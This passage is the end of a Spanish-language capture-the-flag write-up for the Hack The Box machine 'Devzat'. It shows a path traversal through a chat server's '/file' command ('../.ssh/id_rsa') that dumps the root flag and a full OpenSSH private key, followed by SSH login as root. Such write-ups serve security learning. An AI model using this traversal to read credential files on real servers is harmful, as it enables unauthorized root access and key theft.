[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
[SYSTEM] file - Paste a files content directly to chat [alpha]
                                                                                                                                                                                 5 minutes in
catherine: /file ../root.txt CeilingCatStillAThingIn2021?
[SYSTEM] e1b8707c938e4fb49bce2a4023bc8b53
                                                                                                                                                                                10 minutes in
catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
catherine: Connection to devzat.htb closed.
```

Con esta información podemos crear un archivo **`devzatkey`** al cual le damos permisos con **`chmod 600 devzatkey`** y ya podemos conectarnos por SSH.

```console
p3ntest1ng:~$ ssh -i devzatkey root@devzat.htb
root@devzat:~# ls
devzat  go  root.txt
root@devzat:~# cat root.txt
e1b8707c938e4fb49bce2a4023bc8b53
root@devzat:~# 
```

### ¡Gracias por leer hasta el final!

Esta máquina me ha gustado mucho porque se tocan varias técnicas y me ha servido para aprender algo nuevo, ya que no conocía InfluxDB.

#### Nos vemos en un próximo. ¡Feliz hacking! ☠